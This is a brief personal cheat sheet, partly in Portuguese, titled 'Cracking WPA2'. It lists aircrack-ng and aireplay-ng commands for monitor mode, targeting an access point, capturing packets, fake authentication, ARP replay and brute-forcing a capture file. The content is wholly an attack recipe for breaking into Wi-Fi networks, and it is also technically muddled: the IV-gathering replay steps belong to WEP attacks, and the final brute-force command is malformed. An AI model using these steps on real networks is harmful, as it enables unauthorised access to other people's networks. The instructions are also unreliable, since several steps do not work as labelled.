# Cracking WPA2

This is a simple file for remind me some wpa2 cracking instructions.

### Ligar monitoramento
	sudo airmon-ng start <interface>

### Selecionar um alvo
	sudo airodump-ng <monitor>

### Pegar pacotes
	sudo airodump-ng <monitor> -c <canal> --bssid <bssid> -w <nomedoarquivo>

### Injetar mac
	aireplay-ng -1 10 -a <bssid-ap> <monitor>

Lembre de pegar o mac injetado

### Replicar requests de ARP para pegar mais IVs
    aireplay-ng -3 -b <bssid do ap> -h <nssid injetado> <mon>

### Bruteforce no .cap
    aireplay-ng -a 1 -b <bssid do ap> <.cap>
